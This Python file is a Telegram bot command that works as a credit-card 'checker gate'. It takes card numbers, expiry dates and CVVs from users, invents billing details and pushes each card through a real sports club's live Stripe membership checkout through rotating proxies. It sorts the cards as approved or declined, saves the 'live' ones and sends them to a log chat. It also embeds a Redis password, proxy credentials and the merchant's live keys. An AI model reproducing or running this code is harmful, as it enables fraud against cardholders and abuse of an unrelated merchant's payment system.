import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
import bs4
from defs import *
from pyrogram import Client, filters
import json

@Client.on_message(filters.command(["zo"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)

async def sa(Client, message):
    try:
        started_time = time.time()
        verified_gps = open("groups.txt", "r")
        verified_gps = verified_gps.readlines()
        if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
            await message.reply_text(text="""<b>This Group Is Not Verified. Talk With <code>@r0ld3x</code> And Ask For Verification.</b>""",reply_to_message_id=message.message_id)
        else:
            text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> RESULT: <b>CHECKING YOUR INPUT</b>
<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
            msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
            await Client.send_chat_action(message.chat.id, "typing")
            client = pymongo.MongoClient(mongourl, serverSelectionTimeoutMS=5000)
            find = client.bot["main"].find_one({"_id": message.from_user.id})
            if isinstance(find, type(None)) == True:
                await msg.edit_text(f"""<b>Register Yourself To Use Me. Hit /takeme To Register Yourself</b>""")
            elif find['status'] == "F" or find['credits'] == "0":
                await msg.edit_text("""<b>buy paid plan to use this gate hit /buy to see my premium plans</b>""")
            elif find['status'] == "P" and find['credits'] < 2:
                await msg.edit_text("""<b>You comsumed all your credits. hit /buy to buy more credits. And now are demoted to a free user</b>""")
                maindb.update_one({'_id': message.from_user.id},{
                    '$set': {
                        "plan": "Free Plan",
                        "role": "Free User",
                        "status": "F",
                        "credits": 0,
                        }
                    }, upsert=False)
            else:
                r = redis.Redis(
                    host="redis-18001.c82.us-east-1-2.ec2.cloud.redislabs.com",
                    port=18001,
                    password="eO00qpZScxQ6u1UsZ32Y94YuZ1J7pGWR",
                )
                antispam_time = int(r.get(message.from_user.id).decode("utf-8"))
                spam_time = int(time.time()) - antispam_time
                role = find["status"]
                if role == "P" and spam_time < 20:
                    time_left = 20 - spam_time
                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                else:
                    if message.reply_to_message is not None:
                        message.text = message.reply_to_message.text
                    input = re.findall(r"[0-9]+", message.text)
                    try:
                        if len(input) == 0:
                            raise ValueError("Your Card Is Empty")
                        cc = input[0]
                        mes = input[1]
                        ano = input[2]
                        ano1 = input[2]
                        cvv = input[3]
                    except IndexError as e:
                            await msg.edit_text("Your Card Is Incorrect Or Empty")
                    except ValueError as e:
                            await msg.edit_text("Your Card Is Empty")
                    except Exception as e:
                            await Client.send_message(chat_id=loggp, text=e)
                    else:
                        if len(input) == 3:
                            cc = input[0]
                            mes = input[1][:2]
                            ano = input[1][2:]
                            ano1 = input[1][2:]
                            cvv = input[2]
                        if len(mes) > 2:
                            ano = cvv
                            cvv = mes
                            mes = ano1
                        cc_first_letter = int(cc[0])
                        len_mes = len(mes)
                        if cc_first_letter in [1,2,7,8,9,0]:
                            await msg.edit_text("Your Card Invalid")
                        elif int(len(cc))not in [15,16]:
                            await msg.edit_text("Your Card Is To Short")
                        elif int(len(mes)) not in [2,4] or len_mes == 2 and mes > '12' or len_mes == 2 and mes < '00' or len_mes != 2:
                            await msg.edit_text("Your Card Month Is Incorrect")
                        elif int(len(ano)) not in [2,4] or len(ano) < 2 or len(ano) > 4 or len(ano) == 3:
                            await msg.edit_text("Your Card Year Is Incorrect")
                        elif cc_first_letter == 3 and len(cvv) != 4 or len(cvv) < 3 or len(cvv) > 4:
                            await msg.edit_text("Your Card Cvv Is Incorrect")
                        else: 
                            lista = cc + "|" + mes + "|" + ano + "|" + cvv
                            bin = cc[:6]
                            req = requests.Session()
                            req.proxies = {
                                "http": "http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/",
                                "https": "http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/",
                            }
                            res = requests.get("https://jocastabins.herokuapp.com/api/" + bin)
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                await msg.edit_text("Your Card's Bin Is Invalid")   
                            elif(str(message.chat.id) + "\n"in open("bannedbin.txt", "r").readlines()):
                                await msg.edit_text("Your Card's Bin Is Banned")
                            else:
                                bin_data = json.loads(res.text)
                                res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
                                random_data = json.loads(res.text)
                                phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
                                first_name = random_data['results'][0]['name']['first']
                                last_name = random_data['results'][0]['name']['last']
                                street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
                                city = random_data['results'][0]['location']['city']
                                state = random_data['results'][0]['location']['state']
                                zip = random_data['results'][0]['location']['postcode']
                                vendor = bin_data["data"]["vendor"].lower()
                                email = get_email()
                                password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                url= 'https://rathnuregaa.ie/wp-json/wpsp/v2/checkout-session'
                                headers = {
'authority':'rathnuregaa.ie',
'method':'POST',
'path':'/wp-json/wpsp/v2/checkout-session',
'scheme':'https',
'accept':'*/*',
'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'content-length':'11964',
'content-type':'application/x-www-form-urlencoded; charset=UTF-8',
'dnt':'1',
'origin':'https://rathnuregaa.ie',
'referer':'https://rathnuregaa.ie/membership/',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Linux"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-origin',
'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
'x-requested-with':'XMLHttpRequest',
'x-wp-nonce':'5e79a2d693',
}

                                data = {
'form_values[simpay_price]':'price_1IgFgVARuOxiR2l39VPBGDy9',
'form_values[simpay_customer_name]':'Carolyn watson',
'form_values[simpay_form_id]':'2473',
'form_values[simpay_tax_amount]':'0',
'form_values[_wpnonce]':'74e9b91d46',
'form_values[_wp_http_referer]':'/membership/',
'form_data':'{"formId":2473,"formInstance":1,"quantity":1,"isValid":true,"stripeParams":{"key":"pk_live_51FooriARuOxiR2l3kMM6sTVPGlXOAe7DQEu2SUdKcFwAU0cIi6eJKSRHpWZ7IB3xL5a0sDb0iEgv0umhZIgVz64P00jSa9q5EI","success_url":"https://rathnuregaa.ie/payment-confirmation/?form_id=2473","error_url":"https://rathnuregaa.ie/payment-failed/?form_id=2473","name":"Rathnure St. Annes GAA Club - Membership 2021","image":"https://rathnuregaa.ie/wp-content/uploads/2021/01/cropped-site_image.png","locale":"auto","country":"IE","currency":"EUR","description":"Membership 2021","elementsLocale":"auto"},"prices":{"6983df48-5de8-4b9f-accb-9905e00c5dd8":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFgVARuOxiR2l39VPBGDy9","default":true,"label":"Adult Player Membership - €100.00","currency":"eur","currency_symbol":"&euro;","is_zero_decimal":false,"unit_amount":10000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null},"d2659030-e2b2-4a24-8e1b-867489f9176d":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFaEARuOxiR2l3RjEhbwyw","default":false,"label":"Adult Non-Player Membership - €50.00","currency":"eur","currency_symbol":"&euro;","is_zero_decimal":false,"unit_amount":5000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null},"c6927ebf-01e3-4e8f-a3d3-f8615dc83500":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFgWARuOxiR2l3jVLjIAxv","default":false,"label":"18 - 21 Year Old Player Membership - €50.00","currency":"eur","currency_symbol":"&euro;","is_zero_decimal":false,"unit_amount":5000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null},"538a1cca-6c7e-4139-9947-c6a9624e96f9":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFgWARuOxiR2l3dfUw0ywN","default":false,"label":"U18 Player Membership - €30.00","currency":"eur","currency_symbol":"&euro;","is_zero_decimal":false,"unit_amount":3000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null},"59588171-e4a9-4513-ac3d-78c6b802eb77":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFgWARuOxiR2l34GhoQydv","default":false,"label":"Primary School Player Membership - €20.00","currency":"eur","currency_symbol":"&euro;","is_zero_decimal":false,"unit_amount":2000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null},"5426c614-c603-4467-ab83-da9f0c512b16":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFgXARuOxiR2l3MD0HACGT","default":false,"label":"OAP / Retired Membership - €30.00","currency":"eur","currency_symbol":"&euro;","is_zero_decimal":false,"unit_amount":3000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null}},"isTestMode":false,"isSubscription":false,"isTrial":false,"hasCustomerFields":true,"hasPaymentRequestButton":false,"amount":100,"setupFee":0,"minAmount":1,"totalAmount":"","subMinAmount":0,"planIntervalCount":1,"taxPercent":0,"feePercent":0,"feeAmount":0,"stripeErrorMessages":{"invalid_number":"The card number is not a valid credit card number.","invalid_expiry_month":"The cards expiration month is invalid.","invalid_expiry_year":"The cards expiration year is invalid.","invalid_cvc":"The cards security code is invalid.","incorrect_number":"The card number is incorrect.","incomplete_number":"The card number is incomplete.","incomplete_cvc":"The cards security code is incomplete.","incomplete_expiry":"The cards expiration date is incomplete.","expired_card":"The card has expired.","incorrect_cvc":"The cards security code is incorrect.","incorrect_zip":"The cards zip code failed validation.","invalid_expiry_year_past":"The cards expiration year is in the past","card_declined":"The card was declined.","processing_error":"An error occurred while processing the card.","invalid_request_error":"Unable to process this payment, please try again or use alternative method.","email_invalid":"Invalid email address, please correct and try again."},"unknownError":"Unable to complete request. Please try again.","minCustomAmountError":"The minimum amount allowed is %s","subMinCustomAmountError":"The minimum amount allowed is %s","emptyCustomAmountError":"Please enter a custom amount. The minimum amount allowed is %s","startTrial":"Start Trial","paymentButtonText":"Pay with Card","paymentButtonLoadingText":"Please Wait...","companyName":"Rathnure St. Annes GAA Club - Membership 2021","subscriptionType":"disabled","planInterval":"","checkoutButtonText":"Pay {{amount}}","checkoutButtonLoadingText":"Please Wait...","dateFormat":"mm/dd/yy","formDisplayType":"stripe_checkout","paymentMethods":[{"id":"card","name":"Card","nicename":"Credit Card","flow":"none","scope":"popular","countries":["au","at","be","bg","ca","cy","cz","dk","ee","fi","fr","de","gr","hk","in","ie","it","jp","lv","lt","lu","my","mt","mx","nl","nz","no","pl","pt","ro","sg","sk","si","es","se","ch","gb","us"],"currencies":["aed","afn","all","amd","ang","aoa","ars","aud","awg","azn","bam","bbd","bdt","bif","bgn","bmd","bnd","bob","brl","bsd","bwp","bzd","cad","cdf","chf","clp","cny","cop","crc","cve","czk","djf","dkk","dop","dzd","egp","etb","eur","fjd","fkp","gbp","gel","gip","gmd","gnf","gtq","gyd","hkd","hnl","hrk","htg","huf","idr","ils","inr","isk","jmd","jpy","kes","kgs","khr","kmf","krw","kyd","kzt","lak","lbp","lkr","lrd","lsl","mad","mdl","mga","mkd","mnt","mop","mro","mur","mvr","mwk","mxn","myr","mzn","nad","ngn","nio","nok","npr","nzd","pab","pen","pgk","php","pkr","pln","pyg","qar","ron","rsd","rub","rwf","sar","sbd","scr","sek","sgd","shp","sll","sos","srd","std","szl","thb","tjs","top","try","ttd","twd","tzs","uah","ugx","usd","uyu","uzs","vnd","vuv","wst","xaf","xcd","xof","xpf","yer","zar","zmw"],"recurring":true,"stripe_checkout":true}],"taxRates":[],"finalAmount":10000,"planId":"price_1IgFgVARuOxiR2l39VPBGDy9","planSetupFee":0,"planAmount":"100.00","useCustomPlan":false,"customAmount":10000,"coupon":false,"price":{"product_id":"prod_JIrIDTi6ltkCzJ","id":"price_1IgFgVARuOxiR2l39VPBGDy9","default":true,"label":"Adult Player Membership - €100.00","currency":"eur","currency_symbol":"€","is_zero_decimal":false,"unit_amount":10000,"unit_amount_min":null,"can_recur":false,"recurring":null,"line_items":null,"generated_label":"€100.00","simplified_label":"Adult Player Membership - €100.00","currency_min_amount":100},"paymentMethod":{"id":"card","name":"Card","nicename":"Credit Card","flow":"none","scope":"popular","countries":["au","at","be","bg","ca","cy","cz","dk","ee","fi","fr","de","gr","hk","in","ie","it","jp","lv","lt","lu","my","mt","mx","nl","nz","no","pl","pt","ro","sg","sk","si","es","se","ch","gb","us"],"currencies":["aed","afn","all","amd","ang","aoa","ars","aud","awg","azn","bam","bbd","bdt","bif","bgn","bmd","bnd","bob","brl","bsd","bwp","bzd","cad","cdf","chf","clp","cny","cop","crc","cve","czk","djf","dkk","dop","dzd","egp","etb","eur","fjd","fkp","gbp","gel","gip","gmd","gnf","gtq","gyd","hkd","hnl","hrk","htg","huf","idr","ils","inr","isk","jmd","jpy","kes","kgs","khr","kmf","krw","kyd","kzt","lak","lbp","lkr","lrd","lsl","mad","mdl","mga","mkd","mnt","mop","mro","mur","mvr","mwk","mxn","myr","mzn","nad","ngn","nio","nok","npr","nzd","pab","pen","pgk","php","pkr","pln","pyg","qar","ron","rsd","rub","rwf","sar","sbd","scr","sek","sgd","shp","sll","sos","srd","std","szl","thb","tjs","top","try","ttd","twd","tzs","uah","ugx","usd","uyu","uzs","vnd","vuv","wst","xaf","xcd","xof","xpf","yer","zar","zmw"],"recurring":true,"stripe_checkout":true},"livemode":true,"isCustomAmount":false,"customerCaptchaToken":"","paymentCaptchaToken":""}',
'form_id':'2473',
                                }
                                req = requests.post(url, data=data , headers=headers)
                                json_text = json.loads(req.text)
                                if 'error' in json_text:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (INCORRECT NUMBER)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                elif 'sessionId' not in json_text:
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    r.set(message.from_user.id, int(time.time()))
                                else:
                                    sessionId = json_text['sessionId']
                                    headers = {
                                    "authority": "api.stripe.com",
                                    "method": "POST",
                                    "scheme": "https",
                                    "accept": "application/json",
                                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                                    "content-type": "application/x-www-form-urlencoded",
                                    "origin": "https://checkout.stripe.com",
                                    "referer": "https://checkout.stripe.com/",
                                    "sec-fetch-dest": "empty",
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-site",
                                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                    }
                                    data = {
                                    'type':'card',
                                    'card[number]': cc,
                                    'card[cvc]': cvv,
                                    'card[exp_month]': mes,
                                    'card[exp_year]': ano,
                                    'billing_details[name]': first_name + last_name,
                                    'billing_details[email]': email,
                                    'billing_details[address][country]':'US',
                                    'billing_details[address][postal_code]': zip,
                                    'guid':'a90f5540-fdc0-4d4a-bb69-4f516c5c9fc0639c9c',
                                    'muid':'fe7bd185-9a2d-4985-a01f-f16dc79c7386a14e48',
                                    'sid':'df80ce43-7e14-4f17-9841-492ddff54f324db06f',
                                    'key':'pk_live_51FooriARuOxiR2l3kMM6sTVPGlXOAe7DQEu2SUdKcFwAU0cIi6eJKSRHpWZ7IB3xL5a0sDb0iEgv0umhZIgVz64P00jSa9q5EI',
                                    'payment_user_agent':'stripe.js/8837eef7f; stripe-js-v3/8837eef7f; checkout',
                                    }
                                    res = requests.post("https://api.stripe.com/v1/payment_methods",headers=headers,data=data)
                                    json_first = json.loads(res.text)
                                    if 'error' in json_text:
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (INCORRECT NUMBER)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        r.set(message.from_user.id, int(time.time()))
                                    elif 'id' not in json_first:
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>REJECTED[❌] (ERROR)</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        r.set(message.from_user.id, int(time.time()))
                                    else:
                                        id = json_first["id"]
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: ■■■■■□□□□□ 50%
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        url = f"https://api.stripe.com/v1/payment_pages/{sessionId}/confirm"
                                        headers = {
                                        "authority": "api.stripe.com",
                                        "method": "POST",
                                        "scheme": "https",
                                        "accept": "application/json",
                                        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                                        "content-type": "application/x-www-form-urlencoded",
                                        "origin": "https://checkout.stripe.com",
                                        "referer": "https://checkout.stripe.com/",
                                        "sec-fetch-dest": "empty",
                                        "sec-fetch-mode": "cors",
                                        "sec-fetch-site": "same-site",
                                        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                        }
                                        data = {
                                        'eid':'NA',
                                        'payment_method': id,
                                        'expected_amount':'2500',
                                        'expected_payment_method_type':'card',
                                        'key':'pk_live_51FooriARuOxiR2l3kMM6sTVPGlXOAe7DQEu2SUdKcFwAU0cIi6eJKSRHpWZ7IB3xL5a0sDb0iEgv0umhZIgVz64P00jSa9q5EI',}
                                        res = requests.post(url,headers=headers,data=data)
                                        json_first = json.loads(res.text)
                                        errror_code = json_first['error']['decline_code'].upper()
                                        text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>ALMOST COMPLETED</b>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                        await msg.edit_text(text)
                                        try:
                                            if res.status_code == requests.codes.ok:
                                                save_live(lista)
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CHARGED €100"
                                            elif "Thank" in res.text or "Thank" in res.text or '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or 'Success' in res.text or '"status": "succeeded"' in res.text or 'donation_number=' in res.text:
                                                save_live(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " #CVV")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CHARGED €100"
                                            elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
                                                save_live(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " Insufficient")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "LOW FUNDS"
                                            elif "card zip code is incorrect" in res.text or "The zip code you supplied failed validation" in res.text or 'incorrect_zip' in res.text or 'The zip code you supplied failed validation' in res.text:
                                                save_live(lista)
                                                Client.send_message(chat_id=loggp,text=str(lista) + " #zip")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "ZIP INCORRECT"
                                            elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
                                                save_ccn(lista)
                                                await Client.send_message(chat_id=loggp,text=str(lista) + " #CCN")
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "CVV MISMATCH"
                                            elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
                                                response = "APPROVED"
                                                r_logo = "✅"
                                                r_text = "PURCHASE NOT ALLOWED"
                                            elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD INCORRECT"
                                            elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "3D SECURITY"
                                            elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text or 'Your card has been declined by your bank' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = errror_code  #"CARD DECLINED"
                                            elif 'Do Not Honor' in res.text :
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "NO NOT HONOR"
                                            elif "card has expired" in res.text or 'Expired Card' in res.text:
                                                response = "REJECTED"
                                                r_logo = "❌"
                                                r_text = "CARD EXPIRED"
                                            else:
                                                response = "NOT SURE"
                                                r_logo = "❗"
                                                r_text = errror_code
                                        except Exception as e:
                                            await Client.send_message(chat_id=loggp, text=e)
                                        else:
                                            if response is None:
                                                await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @r0ld3x")
                                            else:
                                                credits = find['credits']
                                                credits_left = credits - 2
                                                maindb.update_one({'_id': message.from_user.id},{'$set': {'credits': credits_left}},upsert=False)
                                                text = f"""
<b>〄</b> GATE: <b>STRIPE CHARGE [4]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> RESULT: <b>{response}[{r_logo}] ({r_text})</b>
<b>○</b> BANK INFO: <b>{bin_data['data']['bank']}({bin_data['data']['countryInfo']['code']})[{bin_data['data']['countryInfo']['emoji']}]</b>
<b>○</b> BIN DATA: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [{find['role']}]</b>
<b>○</b> CREDITS LEFT: {credits_left}credits
<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                                await msg.edit_text(text)
                                                r.set(message.from_user.id, int(time.time()))
    except ProxyError as e:
        await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER <code>@r0ld3x</code>")
        await Client.send_message(chat_id=loggp, text="Proxy Dead In zo Gate")
    except Exception as e:
        await Client.send_message(chat_id=loggp, text=e)
        print(e)
